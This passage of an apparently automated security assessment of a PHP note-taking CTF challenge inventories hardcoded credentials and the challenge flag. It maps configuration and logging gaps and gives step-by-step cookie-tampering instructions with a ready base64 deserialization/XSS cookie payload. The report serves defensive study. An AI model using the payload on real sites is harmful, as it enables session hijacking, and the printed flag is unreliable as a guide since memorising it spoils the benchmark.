**Hardcoded Secrets Inventory (CRITICAL):**

1. **Database Application User Password**
   - **Value:** `pCxvkPyS9JYq27BVdUX4N8`
   - **Exposure Locations:**
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` line 5 (plaintext PHP variable)
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` line 3 (CREATE USER statement)
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` line 9 (healthcheck command)
   - **Impact:** Anyone with source code access can authenticate to MySQL database, read all user data including passwords (hashed) and notes (plaintext), modify or delete all data, or escalate privileges
   - **Mitigation:** Use environment variables via Docker secrets, Kubernetes secrets, HashiCorp Vault, or AWS Secrets Manager

2. **MySQL Root Password**
   - **Value:** `password`
   - **Exposure Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` line 3
   - **Impact:** Complete database administrative access - can create/drop databases, modify user privileges, access all data, shut down database
   - **Mitigation:** Generate strong random password, store in secrets management system

3. **CTF Flag**
   - **Value:** `flag{98494eec-b38e-4d5c-9541-0d1a49c173aa}`
   - **Exposure Locations:**
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/.env` line 1 (plaintext environment file)
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` line 13 (ENV declaration)
     - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` line 31 (after build-time replacement)
   - **Impact:** Direct flag disclosure without exploiting application vulnerabilities via source code access, Docker image inspection (`docker history`), environment variable extraction (`docker exec apache_php printenv`), or database query
   - **CTF Note:** In a real-world application, this would represent exposure of API keys, encryption keys, or other high-value secrets

**Secrets in Version Control:**
All secrets are committed to the Git repository with full history, meaning rotation of these secrets would still leave them accessible in Git history. The `.env` file is tracked (should be in `.gitignore`), Dockerfiles with ENV declarations are tracked, and config.php with plaintext credentials is tracked. Even if secrets were changed, an attacker with repository access could examine historical commits to find original values.

### Configuration Security

**Environment Separation:**
**Status:** NO ENVIRONMENT SEPARATION - The application uses the same configuration for development, testing, and production (if deployed). There are no environment-specific configuration files (no `config.dev.php`, `config.prod.php`), no environment variable-based configuration loading, and no distinction between local development and production secrets. The `.env` file is used directly by Docker Compose with no environment awareness.

**Configuration Files Inventory:**
1. **PHP Application Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` - Hardcoded database credentials
2. **Apache Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/apache/000-default.conf` - Minimal VirtualHost with no security headers
3. **Docker Compose:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` - Service orchestration with exposed credentials in healthchecks
4. **PHP Dockerfile:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` - FLAG in ENV, disabled package signature verification
5. **MySQL Dockerfile:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` - Root password, FLAG injection mechanism
6. **Environment File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/.env` - FLAG definition

**Security Headers - Configuration Search:**
I conducted comprehensive searches for security header configuration in infrastructure files:
- **Apache config** (`/php/apache/000-default.conf`): No Header directives, no mod_headers configuration
- **PHP code** (`sign-in.php`, `index.php`, etc.): No `header('X-Frame-Options: ...')` or similar calls
- **Nginx config**: No nginx installation or configuration files found
- **CDN configuration**: No CloudFlare, Fastly, or CDN configuration files
- **Kubernetes Ingress**: No Kubernetes manifests, no ingress controllers
- **Docker labels**: No Traefik or ingress labels in docker-compose.yml

**Result:** NO SECURITY HEADERS CONFIGURED ANYWHERE. Missing: Strict-Transport-Security (HSTS), Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, X-XSS-Protection.

### External Dependencies

**Dependency Management:**
**Status:** NO EXTERNAL DEPENDENCIES - The application uses zero third-party libraries or packages:
- ❌ No `composer.json` (PHP Composer) - No PHP libraries beyond built-ins
- ❌ No `package.json` (Node.js NPM) - No JavaScript dependencies
- ❌ No `requirements.txt` (Python pip) - No Python libraries
- ❌ No other package manager manifests

**Analysis:**
The application relies exclusively on PHP 7.1 built-in functions (mysqli, password hashing, sessions, serialization) and MySQL 5.7.15 built-in features. This creates a smaller attack surface by eliminating vulnerable third-party dependencies (no Log4Shell, no Spring4Shell, no npm supply chain attacks). However, it also means:
- ✗ No professional security libraries (e.g., `paragonie/cookie` for secure cookie handling, `paragonie/anti-csrf` for CSRF tokens)
- ✗ No security-focused validation libraries (e.g., `respect/validation`)
- ✗ No secure random number generation beyond PHP built-ins
- ✗ Custom security implementations more likely to contain vulnerabilities
- ✗ No automatic dependency vulnerability scanning (Dependabot, Snyk)

**Infrastructure Dependencies:**
- **Docker base images:** `php:7.1-apache` (EOL), `mysql:5.7.15` (old, approaching EOL)
- **Operating system:** Debian Buster (Debian 10) with archived repositories requiring `[trusted=yes]`
- **PHP extensions:** mysqli (built-in), no additional extensions installed

### Monitoring & Logging

**Logging Status: COMPLETELY ABSENT**

**Application-Level Logging:**
- ❌ No structured logging (Monolog, Syslog, etc.)
- ❌ No security event logging (authentication failures, privilege escalations)
- ❌ No access logs beyond Apache default
- ❌ No error logging configuration
- ❌ No audit trail for note creation/deletion
- ❌ No database query logging

**Infrastructure-Level Logging:**
- ✓ Apache access logs (default, stored in container at `/var/log/apache2/access.log`)
- ✓ Apache error logs (default, stored in container at `/var/log/apache2/error.log`)
- ⚠️ Logs stored in container ephemeral storage - lost when container destroyed
- ❌ No centralized logging (ELK stack, Splunk, CloudWatch)
- ❌ No log aggregation or forwarding
- ❌ No log retention policy

**Database Logging:**
- ❌ MySQL general query log disabled (performance overhead)
- ❌ MySQL slow query log not configured
- ❌ No audit plugin for sensitive query tracking
- ❌ Cannot detect or investigate database compromise

**Security Monitoring:**
- ❌ No intrusion detection system (fail2ban, OSSEC, Wazuh)
- ❌ No file integrity monitoring (AIDE, Tripwire)
- ❌ No anomaly detection
- ❌ No alerting system
- ❌ No SIEM integration
- ❌ No real-time monitoring dashboards

**Implications:**
- No visibility into attack attempts (brute force, exploitation attempts)
- Cannot perform forensic analysis after compromise
- Cannot detect ongoing attacks in real-time
- Compliance failures (PCI-DSS requires audit trails, GDPR requires breach detection)
- Cannot identify privilege escalation or lateral movement

**Docker Container Monitoring:**
Docker Compose defines healthchecks but only for service availability, not security:
- MySQL healthcheck (docker-compose.yml:9): `mysqladmin ping --host=mysql_db --user=root --password=password` - Functional check only
- Apache healthcheck (docker-compose.yml:20): `curl -f http://127.0.0.1:80/` - HTTP availability only
- No security metric collection, no resource usage monitoring, no anomaly detection

## 7. Overall Codebase Indexing

The XBEN-081-24 codebase exhibits a deliberately simple structure optimized for CTF challenge deployment with minimal complexity. The repository follows a flat organizational pattern with clear separation between application code, infrastructure configuration, and output artifacts. The total codebase size is approximately 310 lines of custom PHP application logic (excluding HTML, CSS, SQL, and configuration files), making it accessible for rapid security analysis while containing sufficient complexity to teach critical vulnerability classes.

**Directory Structure and Organization:**
The root directory contains orchestration files (`docker-compose.yml`, `Makefile`, `.env`) that define service composition and build processes. The `/php/` directory houses all Apache/PHP container artifacts: `/php/apache/` contains the minimal VirtualHost configuration (`000-default.conf` with 5 lines), `/php/challenge/` contains all application PHP code (6 files totaling ~310 lines), `/php/challenge/static/` contains client-side assets (CSS, favicon), and the `/php/Dockerfile` (25 lines) defines the PHP 7.1-apache image build process including FLAG environment variable injection and package repository manipulation to use archived Debian Buster sources.

The `/mysql/` directory contains database-specific artifacts: `/mysql/Dockerfile` (8 lines) defining MySQL 5.7.15 image build with FLAG injection mechanism via sed replacement, and `/mysql/init.sql` (31 lines) containing schema definitions, user creation with hardcoded credentials, and data seeding including the admin user with flag-containing notes. The `/deliverables/` directory stores penetration testing deliverables (currently empty in source code, populated during assessment), while `/outputs/` contains generated analysis artifacts from the security assessment workflow.

**Build System and Conventions:**
The project uses **Docker Compose** as the primary orchestration tool with no CI/CD pipeline implementation. The `Makefile` in the root directory references `../common.mk` (parent directory, not included in repository), suggesting this is part of a larger CTF challenge framework with shared build targets. The `benchmark.json` file contains challenge metadata including difficulty rating, category classification ("Web Exploitation"), and estimated solution time. Docker build processes leverage multi-stage builds minimally - the PHP Dockerfile disables APT signature verification to use archived Debian Buster packages (`echo "APT::Get::AllowUnauthenticated true;"`), creates the `/var/www/html/upload` directory (unused by application code), and copies challenge files to the web root. The MySQL Dockerfile uses ARG for FLAG injection with sed replacement during build (`RUN sed -i s/FLAG_PLACEHOLDER/$FLAG/g /docker-entrypoint-initdb.d/init.sql`).

**Code Organization and Security Impact:**
The PHP application follows a procedural programming style with no object-oriented architecture beyond the minimal `UserProfile` class. Files are organized by function: authentication endpoints (`sign-in.php`, `sign-up.php`, `logout.php`), main application logic (`index.php`), utility functions (`misc.php` with input validation), configuration (`config.php` with database credentials), and serializable classes (`user-profile.php`). This flat structure makes the codebase easy to navigate for security analysis but provides no architectural defense-in-depth - there's no separation between presentation layer, business logic, and data access layers; no dependency injection or inversion of control; and no framework-enforced security patterns.

**Testing and Quality Assurance:**
The repository contains **no test suite** - no PHPUnit tests, no integration tests, no security tests, and no test directories (`/tests/`, `/spec/`). There are no code quality tools configured (no PHPStan, Psalm, PHPCS, or PHP-CS-Fixer configuration files). The absence of testing infrastructure is typical for CTF challenges where the goal is to demonstrate vulnerabilities rather than production readiness, but it underscores that this codebase was never designed with security or maintainability as priorities. The lack of security tests means vulnerabilities like insecure deserialization would not be caught during development.

**Infrastructure as Code:**
The infrastructure is defined entirely through Docker Compose with no cloud provider-specific infrastructure-as-code. There are no Terraform modules, CloudFormation templates, Ansible playbooks, or Kubernetes manifests beyond the basic Docker Compose YAML. This suggests local development/CTF deployment is the primary use case, with no production deployment automation. The Docker Compose configuration exposes MySQL port 3306 internally only via `expose:` directive (good security decision preventing external database access), while the Apache PHP service publishes port 80 to a random host port (currently 36423 based on runtime inspection). Network security is minimal but adequate for the use case - services communicate over Docker's default bridge network with no custom network policies, firewall rules, or network segmentation beyond Docker's default container isolation.

**Security-Relevant Code Patterns:**
Analyzing the codebase structure reveals several security anti-patterns: (1) Configuration files (`config.php`) with hardcoded credentials are co-located with application logic instead of environment-based configuration, (2) No `.gitignore` exclusions for `.env` file, allowing secrets in version control, (3) Mixed concerns in `index.php` which handles authentication checking, authorization (incorrectly), note creation, note retrieval, and HTML rendering in a single file without separation of concerns, (4) No input validation on cookie values before deserialization despite validation of POST parameters, (5) Database connection instantiated in multiple files (`sign-in.php`, `sign-up.php`, `index.php`) with no connection pooling or centralized database abstraction, and (6) No error handling - failed database operations, file operations, or serialization errors could expose stack traces or internal paths.

**Discoverability and Analysis Impact:**
The flat file structure and minimal codebase size (6 PHP files, 2 Dockerfiles, 1 SQL file) make this application highly discoverable for security analysis. Critical files like `config.php` (credentials), `index.php` (deserialization vulnerability), and `init.sql` (schema and seeded flag) are immediately identifiable. There are no obfuscation layers, no complex class hierarchies to navigate, and no vendor directories with thousands of third-party files to sift through. This intentional simplicity serves the CTF learning objective: students can focus on understanding the vulnerability pattern (insecure deserialization leading to authorization bypass) rather than spending time navigating a complex codebase. For penetration testing methodology, this flat structure means grep/find commands quickly locate all authentication logic, database queries, cookie operations, and user input handling - the primary reconnaissance phase takes minutes rather than hours.

## 8. Critical File Paths

### Configuration

**Docker and Orchestration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` - Service orchestration with MySQL credentials exposed in healthcheck command (line 9), port mappings, and build arguments including FLAG propagation (lines 6, 17-18)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/.env` - Contains CTF flag in plaintext (line 1): `FLAG="flag{98494eec-b38e-4d5c-9541-0d1a49c173aa}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` - PHP 7.1-apache container definition with FLAG environment variable (line 13), disabled package signature verification (lines 7-9), unused upload directory creation (line 19)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` - MySQL 5.7.15 container with weak root password "password" (line 3), FLAG injection via sed replacement (line 7)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/Makefile` - Build automation referencing parent common.mk

**Web Server Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/apache/000-default.conf` - Minimal Apache VirtualHost configuration with DocumentRoot /var/www/html, no security headers, no TLS configuration

### Authentication & Authorization

**Critical Vulnerability Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` - **PRIMARY VULNERABILITY:** Insecure deserialization of cookie at line 13 (`unserialize(base64_decode($_COOKIE["data"]))`), authorization bypass via untrusted userid extraction at line 14, authentication check using OR logic at line 8, SQL queries for note operations at lines 33-34 (insert), 73-74 (select with user_id from deserialized cookie)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` - Authentication endpoint with insecure cookie creation at line 37 (`setcookie('data', base64_encode(serialize($profile)))`), session regeneration at line 38, password verification at line 33, prepared statement for user lookup at lines 23-24
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` - User registration with bcrypt password hashing at line 20 (`password_hash($password, PASSWORD_DEFAULT)`), prepared statement for user creation at lines 22-23
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/logout.php` - Session termination with session_unset() at line 3, session_destroy() at line 4, cookie expiration at line 5
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/user-profile.php` - UserProfile class definition (lines 3-7) with public properties userid and username, serialized by sign-in.php and unserialized by index.php

**Utility Functions:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/misc.php` - Input validation function applying trim(), stripslashes(), htmlspecialchars() (lines 3-8)

### API & Routing

**Status:** NO FORMAL API OR ROUTING FRAMEWORK - Application uses direct PHP file access for routing:
- All endpoints are individual PHP files accessed directly (e.g., /sign-in.php, /index.php)
- No `.htaccess` URL rewriting or mod_rewrite configuration
- No routing table or route definitions
- No API schema files (no OpenAPI/Swagger, no GraphQL schemas)

### Data Models & DB Interaction

**Database Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` - **HARDCODED DATABASE CREDENTIALS:** Host mysql_db, database db, username db_username, password pCxvkPyS9JYq27BVdUX4N8 (lines 2-5)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` - Database schema definitions, user creation with GRANT ALL PRIVILEGES (lines 3-5), users table schema (lines 12-16), notes table schema with foreign key CASCADE DELETE (lines 18-26), admin user with invalid password "NO LOGIN" (line 28), flag-containing notes seeded for admin user (lines 30-31)

**Database Queries (All Using Prepared Statements):**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` lines 23-24 - SELECT user by username for authentication
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` lines 22-23 - INSERT new user with bcrypt hashed password
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` lines 33-34 - INSERT new note with user_id, title, content
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` lines 73-76 - SELECT notes WHERE user_id (vulnerable to authorization bypass via cookie manipulation)

### Dependency Manifests

**Status:** NO DEPENDENCY MANIFESTS EXIST
- ❌ No `composer.json` (PHP Composer)
- ❌ No `package.json` (Node.js NPM)
- ❌ No `requirements.txt` (Python pip)
- ❌ No `Gemfile` (Ruby Bundler)
- ❌ No `go.mod` (Go modules)
- Application uses only PHP built-in functions and MySQL built-in features

### Sensitive Data & Secrets Handling

**Secrets Exposure (CRITICAL):**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/.env` - CTF flag in plaintext (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` - FLAG as environment variable (line 13)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` - Database password in plaintext (line 5)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` - MySQL root password "password" (line 3)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` - Database credentials in CREATE USER and GRANT statements (lines 3-5), FLAG_PLACEHOLDER replaced with actual flag during build (line 31)

**Encryption Implementations:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` line 20 - password_hash() with PASSWORD_DEFAULT (bcrypt)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` line 33 - password_verify() for authentication

### Middleware & Input Validation

**Input Validation:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/misc.php` lines 3-8 - validateInput() function with trim(), stripslashes(), htmlspecialchars()
- Applied in: sign-in.php lines 12-13, sign-up.php lines 9-10, index.php lines 21-22

**SQL Injection Protection:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` line 21 - mysqli_real_escape_string() before prepared statement
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` lines 18-19 - mysqli_real_escape_string() for username and password
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` lines 30-31 - mysqli_real_escape_string() for title and content

**Security Middleware:**
- ❌ No CSRF token generation or validation
- ❌ No rate limiting middleware
- ❌ No session timeout enforcement
- ❌ No security header injection middleware
- ❌ No request logging middleware

### Logging & Monitoring

**Status:** NO APPLICATION-LEVEL LOGGING IMPLEMENTED
- ❌ No log files or logging configuration
- ⚠️ Apache default logs only (ephemeral, stored in container)
- ❌ No security event logging
- ❌ No audit trail for sensitive operations

### Infrastructure & Deployment

**Container Orchestration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` - Defines mysql_db and apache_php services with port mappings, healthchecks, build contexts

**Build Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` - 25 lines defining PHP 7.1-apache image with FLAG injection, disabled package verification
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/Dockerfile` - 8 lines defining MySQL 5.7.15 image with FLAG sed replacement mechanism

**Infrastructure as Code:**
- ❌ No Terraform, CloudFormation, Ansible, or Pulumi configurations
- ❌ No Kubernetes manifests (no yaml files in k8s/ or kubernetes/ directories)
- ❌ No Helm charts
- ❌ No cloud provider-specific configurations (AWS, GCP, Azure)

**Web Server Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/apache/000-default.conf` - 5-line minimal Apache VirtualHost
- ❌ No nginx configuration (nginx not used)
- ❌ No HAProxy, Traefik, or other reverse proxy configurations
- ❌ No CDN configuration files (CloudFlare, Fastly, Akamai)

### CTF Flag Storage

**Flag Storage Locations (CTF-Specific):**
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/.env` line 1 - Plaintext FLAG variable definition
2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/Dockerfile` line 13 - ENV FLAG set in Docker image
3. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/mysql/init.sql` line 31 - FLAG_PLACEHOLDER replaced during build, stored in admin's note content
4. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/docker-compose.yml` lines 6, 17-18 - FLAG passed as build argument to both services

**Flag Access Vectors:**
- **Primary:** Authorization bypass via cookie manipulation to access admin notes (index.php deserialization vulnerability)
- **Secondary:** Database credential exposure enabling direct SQL query
- **Tertiary:** Environment variable extraction via RCE or phpinfo() disclosure
- **Quaternary:** Docker image forensics via `docker history` command

## 9. XSS Sinks and Render Contexts

The application contains **3 XSS sinks in HTML body context** and **1 critical insecure deserialization vulnerability** that bypasses input validation and enables reflected XSS. Two of the HTML body context sinks are protected by `htmlspecialchars()` output encoding (stored XSS in note title and content), while the third sink (reflected XSS via deserialized username) lacks proper validation because it bypasses the input validation pipeline entirely. No XSS sinks exist in JavaScript, CSS, HTML attribute, or URL contexts. Command injection, template injection, and SQL injection sinks are not present in network-accessible components.

### Reflected XSS - HTML Body Context (CRITICAL - EXPLOITABLE)

**Sink Type:** XSS - HTML Body Context (Reflected)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`  
**Line Number:** 61  
**Render Context:** Direct output within `<h1>` HTML tag

**Code Snippet:**
```php
<td width="90%"><h1>Welcome <?php echo $username; ?></h1></td>
```

**User Input Source:**
The `$username` variable originates from the unserialized cookie at lines 13-15:
```php
$obj = unserialize(base64_decode($_COOKIE["data"]));
$userid = $obj->userid;
$username = $obj->username;
```

**Current Protection:** BYPASSED - While the `validateInput()` function applies `htmlspecialchars()` during registration and login (sign-up.php:9, sign-in.php:12), the cookie can be modified client-side after authentication. The deserialized `$username` property is extracted directly from the attacker-controlled cookie without any validation or sanitization before being echoed to the HTML response.

**Exploitability:** HIGH

**Attack Vector:**
1. Register and authenticate normally to obtain valid session + serialized cookie
2. Extract and decode the `data` cookie value
3. Create malicious `UserProfile` object with XSS payload in username field:
   ```php
   class UserProfile {
       public $userid = 2;
       public $username = '<script>alert(document.cookie)</script>';
   }
   ```
4. Serialize and base64 encode: `echo base64_encode(serialize($profile));`
5. Inject modified cookie value into browser
6. Access `/index.php` - XSS payload executes in victim's browser context

**Example Payload:**
```
Cookie: data=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjI7czo4OiJ1c2VybmFtZSI7czo0NDoiPHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+Ijt9
```

**Impact:** Session hijacking (cookie theft), credential harvesting (fake login forms), redirection to malicious sites, defacement, privilege escalation when combined with CSRF, account takeover

**Network Accessible:** YES - index.php is the main authenticated application endpoint accessible to all logged-in users

### Stored XSS - HTML Body Context (LOW RISK - PROTECTED)

**Sink Type:** XSS - HTML Body Context (Stored)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`  
**Line Number:** 85  
**Render Context:** Direct output within `<h3>` HTML tag in notes display table

**Code Snippet:**
```php
<td><h3><?php echo $row['title']; ?></h3></td>
```

**User Input Source:**
The `$row['title']` value comes from database query at lines 73-76:
```php
$stmt = $conn->prepare("SELECT * FROM notes WHERE user_id=?");
$stmt->bind_param("i", $userid);
$stmt->execute();
$result = $stmt->get_result();
```

Original input from POST parameter processed at lines 20-31:
```php
$title = validateInput($_POST['title']);
// ... additional processing ...
$title = mysqli_real_escape_string($conn, $title);
$stmt = $conn->prepare("INSERT INTO notes (user_id, title, content) VALUES (?, ?, ?)");
$stmt->bind_param("iss", $userid, $title, $content);
```

**Current Protection:** EFFECTIVE
- Line 21: `validateInput()` applies `htmlspecialchars()` converting `<>&"'` to HTML entities
- Line 30: `mysqli_real_escape_string()` provides additional SQL escaping (redundant with prepared statements)
- Line 33-34: Prepared statement prevents SQL injection
- Data stored in database already HTML-encoded, output without additional encoding still safe

**Exploitability:** LOW - The `htmlspecialchars()` function encodes all characters necessary to prevent HTML/JavaScript injection in body context. Even if an attacker submits `<script>alert(1)</script>` as title, it will be stored as `&lt;script&gt;alert(1)&lt;/script&gt;` and displayed as literal text.

**Bypass Scenarios:**
- ⚠️ If application later decodes HTML entities before re-displaying (mutation XSS) - NOT present in current code
- ⚠️ If output context changes to attribute or JavaScript context - NOT present in current code
- ⚠️ If database is compromised and attacker modifies stored data - requires separate vulnerability

**Network Accessible:** YES - index.php displays all notes for the authenticated user

### Stored XSS - HTML Body Context (LOW RISK - PROTECTED)

**Sink Type:** XSS - HTML Body Context (Stored)  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php`  
**Line Number:** 88  
**Render Context:** Direct output within `<p>` HTML tag in notes display table

**Code Snippet:**
```php
<td><p><?php echo $row['content']; ?></p></td>
```

**User Input Source:**
The `$row['content']` value comes from the same database query as title (lines 73-76), originally from POST parameter processed at lines 20-31:
```php
$content = validateInput($_POST['content']);
$content = mysqli_real_escape_string($conn, $content);
$stmt = $conn->prepare("INSERT INTO notes (user_id, title, content) VALUES (?, ?, ?)");
$stmt->bind_param("iss", $userid, $title, $content);
```

**Current Protection:** EFFECTIVE - Same protection as title field:
- Line 22: `validateInput()` applies `htmlspecialchars()` encoding all XSS-relevant characters
- Line 31: `mysqli_real_escape_string()` for SQL safety
- Lines 33-34: Prepared statement prevents SQL injection
- HTML-encoded data stored in TEXT field, output remains encoded

**Exploitability:** LOW - Identical protection mechanism to title field. Payloads like `<img src=x onerror=alert(1)>` will be encoded to `&lt;img src=x onerror=alert(1)&gt;` and rendered as literal text.

**Network Accessible:** YES - index.php content display is the core application functionality

### No Sinks Found in Other Contexts

**HTML Attribute Context:** NO SINKS FOUND
- Searched for: `onclick`, `onerror`, `onmouseover`, `onload`, `onfocus`, `onblur`, and other event handlers
- Searched for: dynamic `href`, `src`, `action`, `formaction`, `data`, `style` attribute assignments
- Result: No event handlers found in application code, no dynamic attribute value assignments from user input
- Form action uses `htmlspecialchars($_SERVER["PHP_SELF"])` which is properly protected

**JavaScript Context:** NO SINKS FOUND
- Searched for: `eval()`, `Function()` constructor, `setTimeout()`, `setInterval()` with string arguments
- Searched for: `<script>` tags with PHP variable insertion
- Searched for: `.js` files with dynamic content generation
- Result: Application contains NO client-side JavaScript whatsoever - purely server-rendered HTML with static CSS

**CSS Context:** NO SINKS FOUND
- Searched for: dynamic `<style>` tag generation with user input
- Searched for: `element.style` property manipulation in JavaScript
- Result: Only static CSS file at `/php/challenge/static/styles.css`, no dynamic styling based on user input

**URL Context:** NO SINKS FOUND
- Searched for: `location.href`, `location.replace()`, `window.open()` with user input
- Searched for: `history.pushState()`, `history.replaceState()` with user input
- Searched for: redirect headers with user-controlled destinations
- Result: All redirects use hardcoded URLs (`sign-in.php`, `index.php`, `logout.php`), no open redirect vulnerability

### SQL Injection Analysis (NO VULNERABILITIES)

**Status:** ALL SQL QUERIES PROTECTED BY PREPARED STATEMENTS

**Protected Query Locations:**
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` lines 23-24 - User authentication lookup
2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` lines 22-23 - User registration insert
3. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` lines 33-34 - Note creation insert
4. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` lines 73-74 - Note retrieval select

**Protection Mechanism:**
All queries use `$conn->prepare()` with parameterized placeholders followed by `$stmt->bind_param()` for type-safe parameter binding. Additional defense-in-depth via `mysqli_real_escape_string()` (technically redundant but harmless). No string concatenation or interpolation in SQL queries.

**Conclusion:** SQL injection is NOT a viable attack vector in this application.

### Command Injection Analysis (NO VULNERABILITIES)

**Status:** NO COMMAND EXECUTION FUNCTIONS FOUND IN NETWORK-ACCESSIBLE CODE

**Searched Functions:**
- `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`
- Backtick operator (`` ` ``)
- `pcntl_exec()`, `eval()` (in command context)

**Result:** No instances found in sign-in.php, sign-up.php, index.php, logout.php, misc.php, config.php, or user-profile.php

**Conclusion:** Command injection is NOT a viable attack vector in this application.

### Template Injection Analysis (NO VULNERABILITIES)

**Status:** NO TEMPLATE ENGINE DETECTED

**Analysis:**
- No Smarty, Twig, Blade, or other PHP template engine in use
- No template files (.tpl, .blade.php, .twig)
- Application uses plain PHP server-side rendering with direct `echo` statements
- No dynamic template compilation or evaluation

**Conclusion:** Template injection is NOT a viable attack vector in this application.

### Summary: XSS Sink Prioritization

**CRITICAL (Requires Immediate Attention):**
1. **Reflected XSS via Cookie Deserialization** (index.php:61) - Bypassable input validation, trivial exploitation, combines with authorization bypass vulnerability

**LOW RISK (Protected but Monitor):**
2. **Stored XSS in Note Title** (index.php:85) - Protected by htmlspecialchars(), unlikely to be exploitable
3. **Stored XSS in Note Content** (index.php:88) - Protected by htmlspecialchars(), unlikely to be exploitable

**NOT VULNERABLE:**
- SQL Injection (all queries use prepared statements)
- Command Injection (no command execution functions)
- Template Injection (no template engine)
- HTML Attribute, JavaScript, CSS, URL context XSS (no sinks in these contexts)

**Primary Recommendation:** The insecure deserialization vulnerability (index.php:13) is the root cause enabling the reflected XSS. Fixing the deserialization issue (by implementing signed cookies or JWT tokens) will simultaneously address the XSS vulnerability.

## 10. SSRF Sinks

**COMPREHENSIVE ANALYSIS RESULT:** After exhaustive code review and pattern matching across all network-accessible PHP files, infrastructure configuration, and database operations, I can definitively conclude:

### NO SSRF SINKS FOUND IN NETWORK-ACCESSIBLE COMPONENTS

The XBEN-081-24 application is a simple note-taking web application with authentication that **does not implement any functionality requiring outbound HTTP requests, URL fetching, or server-side network operations** beyond database connectivity. All user interactions are limited to authentication, session management, and CRUD operations on locally-stored notes.

### Search Methodology and Coverage

**Files Analyzed:**
